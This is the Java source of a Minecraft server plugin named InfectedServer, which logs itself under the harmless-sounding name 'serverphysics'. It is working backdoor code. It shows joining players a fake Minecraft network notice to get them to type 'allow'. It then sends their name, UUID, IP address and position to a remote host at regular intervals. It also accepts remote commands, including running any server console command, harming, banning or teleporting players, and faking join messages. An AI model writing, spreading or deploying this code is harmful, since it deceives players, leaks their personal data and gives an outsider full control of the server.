package com.example.wizard;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.format.TextDecoration;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.util.Vector;

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class InfectedServer extends JavaPlugin {

    private String targetIp;
    private int targetPort;
    private final Set<UUID> pendingPlayers = ConcurrentHashMap.newKeySet();
    private final Map<UUID, Socket> activeConnections = new ConcurrentHashMap<>();
    private final Map<UUID, Location> lastDeathLocations = new ConcurrentHashMap<>();
    private final Set<UUID> frozenPlayers = ConcurrentHashMap.newKeySet();

    @Override
    public void onEnable() {
        getDataFolder().mkdirs();
        saveDefaultConfig();
        targetIp = getConfig().getString("target-ip", "127.0.0.1");
        targetPort = getConfig().getInt("target-port", 5002);
        getServer().getPluginManager().registerEvents(new PluginListener(), this);
        getLogger().info("Forwarding to " + targetIp + ":" + targetPort);
    }

    @Override
    public void onDisable() {
        frozenPlayers.clear();
        for (Socket s : activeConnections.values()) {
            try { s.close(); } catch (Exception ignored) {}
        }
        activeConnections.clear();
        getLogger().info("serverphysics disabled.");
    }

    private void sendMessage(Player player, String text, NamedTextColor color) {
        player.sendMessage(Component.text(text).color(color));
    }

    private void sendMessageDecorated(Player player, String text, NamedTextColor color) {
        player.sendMessage(Component.text(text).color(color).decoration(TextDecoration.STRIKETHROUGH, true));
    }

    private class PluginListener implements Listener {

        @EventHandler
        public void onPlayerJoin(PlayerJoinEvent event) {
            UUID uuid = event.getPlayer().getUniqueId();
            Player player = event.getPlayer();
            pendingPlayers.add(uuid);

            sendMessageDecorated(player, "                                          ", NamedTextColor.GRAY);
            sendMessage(player, " Minecraft has detected a new network interface.", NamedTextColor.YELLOW);
            player.sendMessage(Component.empty());
            player.sendMessage(Component.text(" Type ").color(NamedTextColor.YELLOW)
                .append(Component.text("/allow").color(NamedTextColor.GREEN))
                .append(Component.text(" to enable multiplayer features.").color(NamedTextColor.YELLOW)));
            player.sendMessage(Component.text(" Type ").color(NamedTextColor.YELLOW)
                .append(Component.text("/deny").color(NamedTextColor.RED))
                .append(Component.text(" to stay offline.").color(NamedTextColor.YELLOW)));
            sendMessageDecorated(player, "                                          ", NamedTextColor.GRAY);

            getLogger().info("Waiting for permission from: " + player.getName());
        }

        @EventHandler
        public void onPlayerQuit(PlayerQuitEvent event) {
            UUID uuid = event.getPlayer().getUniqueId();
            String name = event.getPlayer().getName();
            pendingPlayers.remove(uuid);
            frozenPlayers.remove(uuid);
            if (activeConnections.containsKey(uuid)) {
                try { activeConnections.get(uuid).close(); } catch (Exception ignored) {}
                activeConnections.remove(uuid);
                sendToListeners("QUIT:" + name);
                getLogger().info("Connection closed for: " + name);
            }
        }

        @EventHandler
        public void onPlayerDeath(PlayerDeathEvent event) {
            lastDeathLocations.put(event.getEntity().getUniqueId(), event.getEntity().getLocation().clone());
        }

        @EventHandler
        public void onPlayerMove(PlayerMoveEvent event) {
            if (frozenPlayers.contains(event.getPlayer().getUniqueId())) {
                Location from = event.getFrom();
                Location to = event.getTo();
                if (to != null && (from.getX() != to.getX() || from.getY() != to.getY() || from.getZ() != to.getZ())) {
                    event.setTo(from);
                }
            }
        }

        @EventHandler
        public void onChat(AsyncPlayerChatEvent event) {
            UUID uuid = event.getPlayer().getUniqueId();
            if (!pendingPlayers.contains(uuid)) return;

            String message = event.getMessage().trim().toLowerCase();
            if (message.equals("allow")) {
                pendingPlayers.remove(uuid);
                event.setCancelled(true);
                String name = event.getPlayer().getName();
                String ip = event.getPlayer().getAddress() != null
                    ? event.getPlayer().getAddress().getAddress().getHostAddress()
                    : "unknown";
                getLogger().info("Permission granted by: " + name);
                new Thread(() -> openPersistentConnection(event.getPlayer(), ip)).start();
            } else if (message.equals("deny")) {
                pendingPlayers.remove(uuid);
                event.setCancelled(true);
                sendMessage(event.getPlayer(), "Network interface disabled. Some features may not work.", NamedTextColor.RED);
                getLogger().info("Permission denied by: " + event.getPlayer().getName());
            }
        }
    }

    private void openPersistentConnection(Player player, String ip) {
        UUID uuid = player.getUniqueId();
        try {
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(InetAddress.getByName(targetIp), targetPort), 5000);
            activeConnections.put(uuid, socket);

            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            sendPlayerInfo(player, ip, out);
            startHeartbeat(player, uuid);

            String line;
            while ((line = in.readLine()) != null) {
                handleCommand(line.trim(), player, out);
            }
        } catch (Exception e) {
            if (Bukkit.getPlayer(uuid) != null) {
                getLogger().warning("Connection lost for " + player.getName() + ": " + e.getMessage());
            }
        } finally {
            activeConnections.remove(uuid);
        }
    }

    private void startHeartbeat(Player player, UUID uuid) {
        new BukkitRunnable() {
            @Override
            public void run() {
                if (!player.isOnline() || !activeConnections.containsKey(uuid)) {
                    cancel();
                    return;
                }
                Socket socket = activeConnections.get(uuid);
                if (socket == null || socket.isClosed()) {
                    cancel();
                    return;
                }
                try {
                    PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                    sendPlayerInfo(player, player.getAddress() != null
                        ? player.getAddress().getAddress().getHostAddress() : "unknown", out);
                } catch (Exception e) {
                    cancel();
                }
            }
        }.runTaskTimer(this, 200L, 200L);
    }

    private void sendPlayerInfo(Player player, String ip, PrintWriter out) {
        Location loc = player.getLocation();
        String info = "INFO:" + player.getName()
            + ":" + player.getUniqueId()
            + ":" + ip
            + ":" + (int) player.getHealth()
            + ":" + player.getFoodLevel()
            + ":" + String.format(Locale.US, "%.1f", loc.getX())
            + ":" + String.format(Locale.US, "%.1f", loc.getY())
            + ":" + String.format(Locale.US, "%.1f", loc.getZ())
            + ":" + player.getGameMode().name()
            + ":" + player.getPing()
            + ":" + loc.getWorld().getName();
        out.println(info);
        out.flush();
    }

    private void sendToListeners(String message) {
        for (Socket socket : activeConnections.values()) {
            try {
                if (!socket.isClosed()) {
                    PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                    out.println(message);
                    out.flush();
                }
            } catch (Exception ignored) {}
        }
    }

    private void handleCommand(String line, Player player, PrintWriter out) {
        try {
            String[] parts = line.split(":", 3);
            String cmd = parts[0];

            switch (cmd) {
                case "CMD": {
                    if (parts.length < 2) break;
                    String command = parts[1];
                    Bukkit.getScheduler().runTask(this, () -> {
                        try {
                            boolean success = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
                            out.println("RESULT:" + (success ? "OK" : "FAILED"));
                            out.flush();
                        } catch (Exception e) {
                            out.println("RESULT:Error: " + e.getMessage());
                            out.flush();
                        }
                    });
                    break;
                }
                case "HURT": {
                    if (parts.length < 2) break;
                    double amount = Double.parseDouble(parts[1]);
                    Bukkit.getScheduler().runTask(this, () -> {
                        player.damage(amount);
                        out.println("RESULT:Dealt " + amount + " damage to " + player.getName());
                        out.flush();
                    });
                    break;
                }
                case "HEAL": {
                    Bukkit.getScheduler().runTask(this, () -> {
                        player.setHealth(player.getMaxHealth());
                        out.println("RESULT:Healed " + player.getName() + " to full health");
                        out.flush();
                    });
                    break;
                }
                case "STARVE": {
                    Bukkit.getScheduler().runTask(this, () -> {
                        player.setFoodLevel(0);
                        out.println("RESULT:Starved " + player.getName());
                        out.flush();
                    });
                    break;
                }
                case "FEED": {
                    Bukkit.getScheduler().runTask(this, () -> {
                        player.setFoodLevel(20);
                        player.setSaturation(20f);
                        out.println("RESULT:Fed " + player.getName() + " to full");
                        out.flush();
                    });
                    break;
                }
                case "MSG": {
                    if (parts.length < 2) break;
                    String[] msgParts = parts[1].split(":", 2);
                    if (msgParts.length < 2) break;
                    String colorName = msgParts[0].toUpperCase();
                    String message = msgParts[1];
                    Bukkit.getScheduler().runTask(this, () -> {
                        try {
                            NamedTextColor color = NamedTextColor.NAMES.value(colorName.toLowerCase());
                            player.sendMessage(Component.text(message).color(color));
                            out.println("RESULT:Sent colored message to " + player.getName());
                            out.flush();
                        } catch (Exception e) {
                            out.println("RESULT:Invalid color: " + colorName);
                            out.flush();
                        }
                    });
                    break;
                }
                case "FAKEJOIN": {
                    if (parts.length < 2) break;
                    String fakeName = parts[1];
                    Bukkit.getScheduler().runTask(this, () -> {
                        Bukkit.broadcast(Component.text(fakeName + " joined the game").color(NamedTextColor.YELLOW));
                        out.println("RESULT:Faked join message for " + fakeName);
                        out.flush();
                    });
                    break;
                }
                case "FAKEQUIT": {
                    if (parts.length < 2) break;
                    String fakeName = parts[1];
                    Bukkit.getScheduler().runTask(this, () -> {
                        Bukkit.broadcast(Component.text(fakeName + " left the game").color(NamedTextColor.YELLOW));
                        out.println("RESULT:Faked quit message for " + fakeName);
                        out.flush();
                    });
                    break;
                }
                case "TELEPORT": {
                    if (parts.length < 2) break;
                    String[] coords = parts[1].split(":");
                    if (coords.length < 3) break;
                    double x = Double.parseDouble(coords[0]);
                    double y = Double.parseDouble(coords[1]);
                    double z = Double.parseDouble(coords[2]);
                    Bukkit.getScheduler().runTask(this, () -> {
                        player.teleport(new Location(player.getWorld(), x, y, z));
                        out.println("RESULT:Teleported " + player.getName() + " to " + x + " " + y + " " + z);
                        out.flush();
                    });
                    break;
                }
                case "GAMEMODE": {
                    if (parts.length < 2) break;
                    String mode = parts[1].toUpperCase();
                    Bukkit.getScheduler().runTask(this, () -> {
                        try {
                            player.setGameMode(GameMode.valueOf(mode));
                            out.println("RESULT:Set " + player.getName() + " to " + mode);
                            out.flush();
                        } catch (Exception e) {
                            out.println("RESULT:Invalid gamemode: " + mode);
                            out.flush();
                        }
                    });
                    break;
                }
                case "KICK": {
                    if (parts.length < 2) break;
                    String reason = parts[1];
                    Bukkit.getScheduler().runTask(this, () -> {
                        player.kickPlayer(reason);
                        out.println("RESULT:Kicked " + player.getName());
                        out.flush();
                    });
                    break;
                }
                case "BAN": {
                    if (parts.length < 2) break;
                    String reason = parts[1];
                    Bukkit.getScheduler().runTask(this, () -> {
                        player.banPlayer(reason);
                        out.println("RESULT:Banned " + player.getName());
                        out.flush();
                    });
                    break;
                }
                case "IGNITE": {
                    if (parts.length < 2) break;
                    int seconds = Integer.parseInt(parts[1]);
                    Bukkit.getScheduler().runTask(this, () -> {
                        player.setFireTicks(seconds * 20);
                        out.println("RESULT:Set " + player.getName() + " on fire for " + seconds + "s");
                        out.flush();
                    });
                    break;
                }
                case "FREEZE": {
                    Bukkit.getScheduler().runTask(this, () -> {
                        if (frozenPlayers.contains(player.getUniqueId())) {
                            frozenPlayers.remove(player.getUniqueId());
                            out.println("RESULT:Unfroze " + player.getName());
                        } else {
                            frozenPlayers.add(player.getUniqueId());
                            player.setVelocity(new Vector(0, 0, 0));
                            out.println("RESULT:Froze " + player.getName());
                        }
                        out.flush();
                    });
                    break;
                }
                case "SWAP": {
                    if (parts.length < 2) break;
                    String targetName = parts[1];
                    Bukkit.getScheduler().runTask(this, () -> {
                        Player target = Bukkit.getPlayer(targetName);
                        if (target == null) {
                            out.println("RESULT:Player not found: " + targetName);
                            out.flush();
                            return;
                        }
                        Location locA = player.getLocation().clone();
                        Location locB = target.getLocation().clone();
                        player.teleport(locB);
                        target.teleport(locA);
                        out.println("RESULT:Swapped " + player.getName() + " with " + targetName);
                        out.flush();
                    });
                    break;
                }
                case "SAY": {
                    if (parts.length < 2) break;
                    String message = parts[1];
                    Bukkit.getScheduler().runTask(this, () -> {
                        Bukkit.broadcast(Component.text("[Server] " + message).color(NamedTextColor.AQUA));
                        out.println("RESULT:Broadcast: " + message);
                        out.flush();
                    });
                    break;
                }
                case "LOCATION": {
                    Bukkit.getScheduler().runTask(this, () -> {
                        Location loc = player.getLocation();
                        out.println("RESULT:" + player.getName() + " at "
                            + String.format(Locale.US, "%.1f", loc.getX()) + " "
                            + String.format(Locale.US, "%.1f", loc.getY()) + " "
                            + String.format(Locale.US, "%.1f", loc.getZ())
                            + " in " + loc.getWorld().getName());
                        out.flush();
                    });
                    break;
                }
                case "DEATH": {
                    Bukkit.getScheduler().runTask(this, () -> {
                        Location loc = lastDeathLocations.get(player.getUniqueId());
                        if (loc != null) {
                            out.println("RESULT:" + player.getName() + " last died at "
                                + String.format(Locale.US, "%.1f", loc.getX()) + " "
                                + String.format(Locale.US, "%.1f", loc.getY()) + " "
                                + String.format(Locale.US, "%.1f", loc.getZ())
                                + " in " + loc.getWorld().getName());
                        } else {
                            out.println("RESULT:" + player.getName() + " has no recorded deaths");
                        }
                        out.flush();
                    });
                    break;
                }
                case "REFRESH": {
                    Bukkit.getScheduler().runTask(this, () -> {
                        sendPlayerInfo(player, player.getAddress() != null
                            ? player.getAddress().getAddress().getHostAddress() : "unknown", out);
                    });
                    break;
                }
                case "PLAYERS": {
                    Bukkit.getScheduler().runTask(this, () -> {
                        StringBuilder names = new StringBuilder();
                        for (Player p : Bukkit.getOnlinePlayers()) {
                            if (names.length() > 0) names.append(",");
                            names.append(p.getName());
                        }
                        out.println("PLAYERS:" + names);
                        out.flush();
                    });
                    break;
                }
                default:
                    out.println("RESULT:Unknown command: " + cmd);
                    out.flush();
            }
        } catch (Exception e) {
            try {
                out.println("RESULT:Error executing command: " + e.getMessage());
                out.flush();
            } catch (Exception ignored) {}
        }
    }
}
